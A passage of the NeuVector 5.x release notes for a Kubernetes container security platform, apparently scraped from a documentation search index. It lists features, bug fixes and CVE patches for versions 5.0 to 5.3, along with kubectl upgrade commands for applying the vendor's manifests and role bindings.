from ARM based platforms will automatically pull the appropriate ARM64 NeuVector images.Support webhooks through a proxyImprove admission control auditing function to include results of all rules. List the result of every rule, and adds another entry for the final action the would occur when evaluated in a live admission control deployment.Apply disabled Admission Control rules via CRD or yaml (kubectl)Vulnerability Profile export / import through console, CRD, or REST API. Importing will replace the existing profile. Deleting the CRD will result in an empty profile.Compliance Profile template export / import through console, CRD, or REST API. Importing will replace the existing template.Add a 'Manual' status in the compliance reports for CIS benchmarks that must be run manually by users (not run by NeuVector).Improve UI loading/performance of Vulnerabilities pageUnify browser session login. With this, all tabs in the browser share the same login session, opening a new tab from an existing session does not ask for credentials, and when one tab logs out, all tabs are logged out.Enhancements to security of console (UI): 1) add mandatory security headers (X-Content-Type-Options nosniff; X-XSS-Protection 1; mode=block; X-Frame-Options SAMEORIGIN; Cache-Control private, no-cache, no-store, must-revalidate HTTP Strict Transport Security max-age=15724800, 2) add CSP header (e.g. set a ‘default-src’ directive), 3) remove server name disclosureSupport newer versions of CIS benchmarks. Kubernetes (1.8.0), Kubernetes V1.24 (1.0.0), Kubernetes V1.23 (1.0.1), RedHat OpenShift Container Platform (1.4.0)Show in Assets -&gt; Containers -&gt; Container details containers which were scanned in registries versus runtimeAdd link to Group in Security Risks -&gt; Vulnerabilities -&gt; Impact popup to easily edit group modeSupport deep linking in URL's to image and/or container vulnerability pageAdd password reset option for admin to reset user password in console Settings -&gt; UsersAllow sending event logs to controller pod logs in Settings -&gt; Configuration -&gt; Notification. The events sent will begin with 'notification=' and be saved only to the leader controller pod. Note that there is a bug in this version where, in order to change the event level SYSLOG must be enabled (and can be disabled if desired after changing the level).Remove requirement for controller/enforcer to mount &quot;/host/cgroup&quot;.Add Get Support menu with links to slack, documentation, and other resourcesFill message field to /v1/log/activity logs  #####Bug Fixes  Internal Server Error in Security Risks -&gt; Vulnerabilities with a high number of CVEsSIGSEGV: segmentation violation on controllerDeleting vulnerable files (e.g. jar) doesn't remove from vulnerability listInvalid Syslog certificate using the signature algorithm SHA256withECDSANeuVector shows security events that should be allowed by a Network RuleUn-managed node with &quot;zombie&quot; enforcer runningAdvanced Filter shows Remediation and Impact fields blankFix string handling to prevent unexpected Enforcer restartUnexpected violations relating to built-in groupsSupport-bundle enforcer debug RPC call for data returns errorGroup is not matching in Security EventsSend events to slack is not working - with proxyShowing security events for allowed network rules  #####Other  Add run-time container engine (socket) automatic detection to Helm chartRemove setting for running controller in privileged mode in Helm chart, and requirement for controller/enforcer to mount &quot;/host/cgroup&quot;.The sample kubernetes deployment files have been removed from the NeuVector docs. Please refer to the link for examples.  #####Highlighted Changes Which May Require Changes for Manual Deployments (all changes are already reflected in latest Helm chart for 5.3.x)  Auto detection of container run-time (socket) removes the need to specify the container run-time and socket path.Removal of requirement to run the controller in privileged mode removes the need for mounting runtime socket and mounted /host/cgroup/Added role/role binding for neuvector-binding-secret as well as neuvector-secret in yaml.New service accounts and role bindings required for 5.3All referenced deployment yaml files now have /5.3.0/ in their paths  5.2.4-s1 January 2024​  Security Patch Release​  Remediates CVE-2023-6129 in openssl, and CVE-2023-46219, CVE-2023-46218 in curl.  5.2.4 November 2023​  Bug Fixes​  Azure AKS ValidatingWebhookConfiguration changes and error logging.  5.2.3 November 2023​  Enhancements​  Add support for NVD API 2.0 in Scanner.Scan the container host in scanner standalone mode.  docker run --rm --privileged --pid=host neuvector/scanner -n   Bug Fixes​  Scan on a node fails due to deadlocked docker cp / grpc issue.  5.2.2-s1 October 2023​  Security Update​  Update packages to remediate CVEs including High CVE-2023-38545 and CVE-2023-43804.  5.2.2 October 2023​  Security Advisory for CVE-2023-32188​  Remediate CVE-2023-32188 “JWT token compromise can allow malicious actions including Remote Code Execution (RCE)” by auto-generating certificate used for signing JWT token upon deployment and upgrade, and auto-generating Manager/RESTful API certificate during Helm based deployments. Certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.Auto-generation of Manager, REST API, and registry adapter certificate requires using Helm-based install using NeuVector helm version 2.6.3 or later.Built-in certificate is still used for yaml based deployments if not replaced during deployment; however, it is recommended to replace these (see next line).Manual replacement of certificate is still supported and recommended for previous releases or yaml based deployments. See the NeuVector GitHub security advisory here for a description.Use of user-supplied certificates is still supported as before for both Helm and yaml based deployments. Add additional controls on custom compliance scripts. By default, custom script are now not allowed to be added, unless the environment variable CUSTOM_CHECK_CONTROL is added to Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).Prevent LDAP injection - username field is escaped.  Enhancements​  Add additional scan data to CVE results sent by SYSLOG for layered scansSupport NVD API 2.0 for scan CVE databaseProvide container image build date in Assets -&gt; Container detailsAdjust sorting for Network rules: disable sorting in Network rules view but enable sorting of network rules in Group view.Enable/disable TLS 1.0 and TLS 1.1 detection/alerting with environment variables to Enforcer THRT_SSL_TLS_1DOT0, THRT_SSL_TLS_1DOT1. Disabled by default.Add environment variable AUTO_PROFILE_COLLECT for Controller and Enforcer to assist in capturing memory usage when investigating memory pressure events. Set value = 1 to enable.Configuration assessments against Admission Control should show all violations with one scan.Add more options for CVE report criteria in Response Rules. Example 1 - &quot;cve-high-with-fix:X&quot; means: When # of (high vulnerability that have been fixed) &gt;= X, trigger the response rule. Example 2 - &quot;cve-high-with-fix:X/Y&quot; means: When # of (high vulnerability that were reported Y days ago &amp; have been fixed) &gt;= X, trigger the response rule.  Bug Fixes​  Export of group policy does not return any actual YAML contentsImprove pruning of namespaces with dedicated functionNeuVector namespace user cannot see assets--&gt;namespacesSkip handling the CRD CREATE/UPDATE requests if the CR's namespace is already deletedProvide workaround for part of CRD groups which cannot be pruned successfully after namespaces are deleted.  5.2.1 August 2023​  Enhancements​  Report layered scan results and additional CVE data in SYSLOG messages. This is enabled through a checkbox in Settings -&gt; Configuration -&gt; SYSLOGExport NIST 800-53 mappings (to docker CIS benchmarks) in the exported csv compliance reportSupport Proxy setting in image signature verificationInclude image signature scan result in the downloaded CVE reportSupport pod annotations for Admission Control Policies, available through the Custom criteriaAdd Last Modified field to filter for vulnerabilities report printing, as well as Advanced Filter in Vulnerabilities view  Bug fixes​  Do not create default admin with default password in initial NeuVector deployment for AWS billing (CSP adapter) offering, requiring user to use a secret to create admin username and passwordFix .json file which increased size and crashed a kubernetes nodeImprove SQL injection detection logicWhen installing the helm crd chart first before installing the NeuVector core chart, service accounts are missingImage scan I.4.1 compliance result is incorrectVulnerability advanced filter report showing images from all other namespace  5.2.0 July 2023​  Enhancements​  Support tokens for NeuVector API access. See Settings -&gt; User, API Keys... to create a new API key. Keys can be set to default or custom roles.Support AWS Marketplace PAYG billing for NeuVector monthly support subscriptions. Users can subscribe to NeuVector by SUSE support, billed monthly to their AWS account based on previous month's average node count usage. Details here.Support image signing for admission controls. Users can require NeuVector to verify that images are signed by specific parties before they can be deployed into the production environment, through an integration with Sigstore/Cosign. See Assets -&gt; Sigstore Verifiers for creating new signature assets. Rules can then be created with criteria Image Signing and/or Image Sigstore Verifiers.Enable each admission control rule to have its own mode of Monitor or Protect. A Deny action in Monitor mode will alert, and a Deny action in Protect mode will block. Allow actions are unaffected.Add a new regex operator in Policy &gt; Admission Control &gt; Add Rule for Users and User Groups to support regex. Support operators &quot;matches ANY regex in&quot; and &quot;matches NONE regex in&quot;.Add support for admission control criteria such as resource limits. A new criteria is added for Resource Limits, and additional criteria are supported through the Custom Criteria settings.Support invoking NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters. NOTE: There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).Searchable SaaS service for CVE lookups. Search the latest NeuVector CVE database to see if a specific CVE exists in the database. This service is available for NeuVector Prime (paid support subscription) customers. Contact support through your SCC portal for access.Allow user to disable network protection but keep WAF/DLP functioning. Configure Network Policy Enablement in Settings -&gt; Configuration.Use less privileged services accounts as required for each NeuVector component. A variable “leastPrivilege” is introduced. The default is false. NOTE: Using the current helm chart with this variable on a release prior to 5.2.0 will not function properly.Bind to non-default service account to meet CIS 1.5 5.1.5 recommendation.Enable administrator to configure user default Session Time out in Settings -&gt; Users, API Keys &amp; Roles.Customizable login banner and customizable UI header text for regulated and government deployments. Requirements for configuration can be found here.SYSLOG support for TLS encrypted transport. Select TCP/TLS in Settings -&gt; Configuration for SYSLOG.Enable deployment of the NeuVector monitor helm chart from Rancher Manager.Remove upper limit for top level domain in URL validator for registry scanning.Scan golang dependencies, including run-time scans.Support Debian 12 (Bookworm) vulnerability scan.Add CSV export for Registry / Details to export CVEs for all images in configured registry in Assets -&gt; Registries for a selected registry.Allow NeuVector to set several ADFS certificates in parallel in x.509 certificate field.Add and display the comment field for Response Rules.Specify what NeuVector considers to be system containers through environment variable. For example, for Rancher and default namespaces: NV_SYSTEM_GROUPS=*cattle-system;defaultAdd support for Kubernetes 1.27 and OpenShift 4.12  Bug Fixes​  Reduce repeating logs in enforcer/controller logs.Multiple clusters page does not render.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Manually allowed network rule not getting applied and resulting in violation for pause image.Blocking SSL connections even if a network rule permits the traffic under certain initial conditions.Security events warning even with allowed network rules due to policy update issue in synchronization.Network Activities wrongly associating custom group traffic to external.Default service account token of the namespace mounted in each pod is too highly privileged.Despite defining the network rules, violations getting logged under security events (false positives) when the container has stopped due to out of memory (OOM) error.Allow user to disable/enable detection and protection against unmanaged container in cluster. This can be set through the Manager CLI:  set system detect_unmanaged_wl status -h Usage: cli set system detect_unmanaged_wl status [OPTIONS] {true|false} Enable/disable detect unmanaged container   Other​  Add &quot;leastPrivilege&quot; setting in Helm chart. Add helm option for New_Service_Profile_Baseline. A new Helm chart (core) version is published for 5.2.Enable AWS Marketplace (billing adapter) integration settings in Helm chart.Update configmap to support new features (multiple ADFS certificates, zero drift, New_Service_Profile_Baseline, SYSLOG TLS, user timeout)Update supported Kubernetes versions to 1.19+, and OpenShift 4.6+ (1.19+ with CRI-O)  5.1.3 May 2023​  Enhancements​  Add new vulnerability feed for scanning Microsoft .NET framework.Enforcer stats are disabled by default in Prometheus exporter to improve scalability.Usability improvement: Using scanner to scan single image and print the result (see example below).Add imagePullPolicy check in admission control rules criteria.Show warning message when CRD schema is out of date.  Bug Fixes​  Network Activity screen does not render or incorrectly renders.Empty group auto-removal takes 2 hours to delete instead of 1 hour according to schedule.Compliance profile doesn’t show in UI console.Advanced Filter in Security Events Missing &quot;Error&quot; Level.Saved password with special character fails on future authentication attempt.Multiple clusters page does not render properly when requests are high.Registry detail (bottom) pane not updating.  Scanner Sample Output​  Image: https://registry.hub.docker.comlibrary/alpine:3.4 Base OS: alpine:3.4.6 TOTAL: 6, HIGH: 1, MEDIUM: 5, LOW: 0, UNKNOWN: 0 ┌─────────┬───────────────┬──────────┬───────────┬───────────────┬────────────┐ │ PACKAGE │ VULNERABILITY │ SEVERITY │ VERSION │ FIXED VERSION │ PUBLISHED │ ├─────────┼───────────────┼──────────┼───────────┼───────────────┼────────────┤ │ openssl │ CVE-2018-0732 │ High │ 1.0.2n-r0 │ 1.0.2o-r1 │ 2018-06-12 │ │ ├───────────────┼──────────┤ ├───────────────┼────────────┤ │ │ CVE-2018-0733 │ Medium │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0734 │ │ │ 1.0.2q-r0 │ 2018-10-30 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0737 │ │ │ 1.0.2o-r2 │ 2018-04-16 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-0739 │ │ │ 1.0.2o-r0 │ 2018-03-27 │ │ ├───────────────┤ │ ├───────────────┼────────────┤ │ │ CVE-2018-5407 │ │ │ 1.0.2q-r0 │ 2018-11-15 │ └─────────┴───────────────┴──────────┴───────────┴───────────────┴────────────┘   5.1.2 March 2023​  Enhancements​  Support virtual host based address group and policy matching network protections. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.  Bug Fixes​  Fix application slowness on GKE Container Optimized OS (COS) nodes when in Protect mode.SUSE Linux (SLES) 15.4 CVE not matching in scanner. With this fix, if the severity is provided in the feed, the vulnerability will be added to the database, even if the NVD record is missing. It is possible that the report includes vulnerabilities without CVE scores.  Other​  Enhance Admission Control CRD options in helm https://github.com/neuvector/neuvector-helm/pull/237.Add new enforcer environment variables to helm chart.  5.1.1 February, 2023​  Enhancements​  Add “package” as information to the syslog-event for a detected vulnerability.Add Enforcer environment variable ENF_NETPOLICY_PULL_INTERVAL - Value in seconds (recommended value 60) to reduce network traffic and resulting resource consumption by Enforcer due to policy updates/recalculations. (Note: this was an undocumented addition until August of 2023).   - name: ENF_NETPOLICY_PULL_INTERVAL value: &quot;60&quot; &lt;== regulate the pulling gap by 60 seconds   Bug Fixes​  Empty group deletion errors &quot;Object not found&quot;Traffic within the same container alerting/blockingUnexpected implicit violations for istio egress traffic with allow rule in placeWhen upgrading from NeuVector 4.x release, incorrect pod group membership causes unexpected policy violationOIDC authentication failed with ADFS when extra encoding characters appear in the requestHigh memory usage by dp creating and deleting podsUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552Various UI bugs fixed  Other​  Helm chart updated to enable replacement of certificate for internal communications  5.1.0 December, 2022​  Enhancements​  Centralized, multi-cluster scanning (CVE) database. The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates. This issue does not occur on new deployments.Remove license from configuration screen (no longer required).  5.0.6-s1 March, 2023​  Bug Fixes​  Update alpine packages to remediate CVEs in curl including CVE-2023-23914, CVE-2023-23915, and CVE-2023-23916  5.0.6 February, 2023​  Bug Fixes​  High memory usage in dpMsgConnectionHigh memory usage on dp process in enforcer if there are many learned policy rules with unmanaged workload (memory leak)tcpdump is unable to start successfully when sniffering a traffic on containerUpdate alpine to remediate several CVEs including Manager: CVE-2022-37454, CVE-2022-42919, CVE-2022-45061, CVE-2021-46848; Enforcer: CVE-2022-43551, CVE-2022-43552  5.0.5 November, 2022​  Bug Fixes​  Upgrading to 5.0.x results in an error message about Manager, Controller, Enforcer running different versions.Enforcers experiencing go routine panic resulting in dp kill. WebUI does not reflect enforcer as online.Unexpected Process.Profile.Violation incident in NV.Protect group on which command on coreos.  5.0.4 October, 2022​  Security updates​  Update alpine to remove critical CVE-2022-40674 in the manager expat library, as well as other minor CVEs.  Enhancements​  Add support for Antrea CNI  Bug Fixes​  Fix unexpected process.profile.violation incident in the NV.Protect group.When SSL is disabled on manager UI access, user password is printed to the manager log.  5.0.3 September, 2022​  Enhancements​  Do not display the EULA after successful restart from persistent volume.Use the image filter in vulnerability profile setting to skip container scan results.Support scanner in GitHub actions at https://github.com/neuvector/neuvector-image-scan-action.Add Enforcer environment variables for disabling secrets scanning and running CIS benchmarks   env: - name: ENF_NO_SECRET_SCANS (available after v4.4.4) value: &quot;1&quot; - name: ENF_NO_AUTO_BENCHMARK (after v5.0.3) value: &quot;1&quot;   Bug Fixes​  Enforcer unable to start occasionally.Connection leak on multi-cluster federation environments.Compliance page not loading some times in Security Risks -&gt; Compliance  5.0.2 July 2022​  Enhancements​  Rancher hardened and SELinux clusters are supported.  Bug Fixes​  Agent process high cpu usage on k3s systems.AD LDAP groups not working properly after upgrade to 5.0.Enforcer keeps restating due to error=too many open files (rke2/cilium).Support log is unable to download successfully.  5.0.1 June 2022​  Enhancements​  Support vulnerability scan of openSUSE Leap OS (in scanner image).Scanner: implement wipe-out attributes during reconstructing image repo.Verify NeuVector deployment and support for SELinux enabled hosts. See below for details on interim patching until helm chart is updated.Distinguish between Feature Chart and Partner Charts in Rancher UI more prominently.+ Improve ingress annotation for nginx in Rancher helm chart. Add / update ingress.kubernetes.io/protocol: https to nginx.ingress.kubernetes.io/backend-protocol: &quot;HTTPS&quot;.Current OpenShift Operator supports passthrough routes for api and federation services. Additional Helm Value parameters are added to support edge and re-encrypt route termination types.  Bug Fixes​  AKS cluster could add unexpected key in admission control webhook.Enforcer is not becoming operational on k8s 1.24 cluster with 1.64 containerd runtime. Separately, enforcer sometimes fails to start.Any admin-role user(local user or SSO) who promotes a cluster to fed master should be automatically promoted to fedAdmin role.When sso using Rancher default admin into NeuVector on master cluster, the NeuVector login role is admin, not fedAdmin.Fix several goroutine crashes.Implicit violation from host IP not associated with node.ComplianceProfile does not show PCI tag.LDAP group mapping sometimes is not shown.Risk Review and Improvement tool will result in error message &quot;Failed to update system config: Request in wrong format&quot;.OKD 3.11 - Clusterrole error shows even if it exists.  CVE Remediations​  High CVE-2022-29458 cve found on ncurses package in all images.High CVE-2022-27778 and CVE-2022-27782 found on curl package in Updater image.  Details on SELinux Support​  NeuVector does not need any additional setting for SELinux enabled clusters to deploy and function. Tested deploying NeuVector on RHEL 8.5 based SELinux enabled RKE2 hardened cluster. Neuvector deployed successfully if PSP is enabled and patching Manager and Scanner deployment. The next chart release should fix the below issue.  Attached example for enabling psp from Rancher chart and given below the commands for patching Manager and Scanner deployment. The user ID in the patch command can be any number.  kubectl patch deploy -ncattle-neuvector-system neuvector-scanner-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}' kubectl patch deploy -ncattle-neuvector-system neuvector-manager-pod --patch '{&quot;spec&quot;:{&quot;template&quot;:{&quot;spec&quot;:{&quot;securityContext&quot;:{&quot;runAsUser&quot;: 5400}}}}}'   Example for enabling PSP:  [neuvector@localhost nv]$ getenforce Enforcing [neuvector@localhost nv]$ sestatus SELinux status: enabled SELinuxfs mount: /sys/fs/selinux SELinux root directory: /etc/selinux Loaded policy name: targeted Current mode: enforcing Mode from config file: enforcing Policy MLS status: enabled Policy deny_unknown status: allowed Memory protection checking: actual (secure) Max kernel policy version: 33 [neuvector@localhost nv]$ kk get psp Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+ NAME PRIV CAPS SELINUX RUNASUSER FSGROUP SUPGROUP READONLYROOTFS VOLUMES global-restricted-psp false RunAsAny MustRunAsNonRoot MustRunAs MustRunAs false configMap,emptyDir,projected,secret,downwardAPI,persistentVolumeClaim neuvector-binding-psp true SYS_ADMIN,NET_ADMIN,SYS_PTRACE,IPC_LOCK RunAsAny RunAsAny RunAsAny RunAsAny false * system-unrestricted-psp true * RunAsAny RunAsAny RunAsAny RunAsAny false * [neuvector@localhost nv]$ nvpo.sh NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES neuvector-controller-pod-54f69f7f9c-6h822 1/1 Running 0 5m51s 10.42.0.29 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-enforcer-pod-jz77b 1/1 Running 0 5m51s 10.42.0.30 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-manager-pod-588488bb78-p6vf9 1/1 Running 0 111s 10.42.0.32 localhost.localdomain &lt;none&gt; &lt;none&gt; neuvector-scanner-pod-87474dcff-s8vgt 1/1 Running 0 114s 10.42.0.31 localhost.localdomain &lt;none&gt; &lt;none&gt;   5.0.0 General Availability (GA) Release May 2022​  Enhancements​  Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. This deployment pulls from the mirrored Rancher repository (e.g. rancher/mirrored-neuvector-controller:5.0.0) and deploys into the cattle-neuvector-system namespace. NOTE: Requires updated Rancher release 2.6.5 May 2022 or later, and only admin and cluster owner roles are supported at this time.Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy. Configure proxy in Settings -&gt; Configuration, and enable proxy when configuring federation connections.Monitor required rbac's clusterrole/bindings and alert in events and UI if any are missing.Support criteria of resource limitations in admission control rules.Support Microsoft Teams format for webhooks.Support AD/LDAP nested groups under mapped role group.Support clusterrolebindings or rolebindings with group info in IDP for Openshift.Allow network rules and admission control rules to be promoted to a Federated rule.  Bug Fixes​  Fix issue of worker federation role backup should restore into non-federated clusters.Improve page loading times for large number of CVEs in Security Risks -&gt; VulnerabilitiesAllow user to switch mode when they select all groups in Policy -&gt; Groups menu. Warn if the Nodes group is also selected.Collapse compliance check items of the same name and make expandable.Enhance security of gRPC communications.Fixed: unable to get correct workload privileged info in rke2 setup.Fix issue with support of openSUSE Leap 15.3 (k8s/crio).  Other Updates​  Helm chart update appVersion to 5.0.0 and chart version to 2.2.0Removed serverless scanning feature/menu.Removed support for Jfrog Xray scan result integration (Artifactory registry scan is still supported).Support for deployment on ECS is no longer provided. The allinone should still be able to be deployed on ECS, however, the documentation of the steps and settings is no longer supported.  ","version":"Next 🚧","tagName":"h3"},{"title":"Upgrading from NeuVector 4.x to 5.x (prior to 5.2.x)​","type":1,"pageTitle":"5.x Release Notes","url":"/next/releasenotes/5x#upgrading-from-neuvector-4x-to-5x-prior-to-52x","content":" note The instructions below apply to upgrades to 5.0.x and 5.1.x. For 5.2.x, service accounts and bindings have changed, and should be reviewed to plan upgrades.  For Helm users, update to NeuVector Helm chart 2.0.0 or later. If updating an Operator or Helm install on OpenShift, see note below.  Delete old neuvector-binding-customresourcedefinition clusterrole  kubectl delete clusterrole neuvector-binding-customresourcedefinition   Apply new update verb for neuvector-binding-customresourcedefinition clusterrole  kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions   Delete old crd schema for Kubernetes 1.19+  kubectl delete -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/crd-k8s-1.19.yaml   Create new crd schema for Kubernetes 1.19+  kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.0.0/admission-crd-k8s-1.19.yaml   Create a new Admission, DLP and WAF clusterrole and clusterrolebinding  kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:default kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=list,delete --resource=nvdlpsecurityrules kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:default   Update image names and paths for pulling NeuVector images from Docker hub (docker.io), e.g.  neuvector/manager:5.0.0neuvector/controller:5.0.0neuvector/enforcer:5.0.0neuvector/scanner:latestneuvector/updater:latest  Optionally, remove any references to the NeuVector license and registry secret in Helm charts, deployment yaml, configmap, scripts etc, as these are no longer required to pull the images or to start using NeuVector.  Note about SCC and Upgrading via Operator/Helm  Privileged SCC is added to the Service Account specified in the deployment yaml by Operator version 1.3.4 and above in new deployments. In the case of upgrading the NeuVector Operator from a previous version to 1.3.4 or Helm to 2.0.0, please delete Privileged SCC before upgrading.  oc delete rolebinding -n neuvector system:openshift:scc:privileged   Beta 1 version released April 2022​  Feature complete, including Automated Promotion of Group Modes. Promotes a Group’s protection Mode based on elapsed time and criteria. 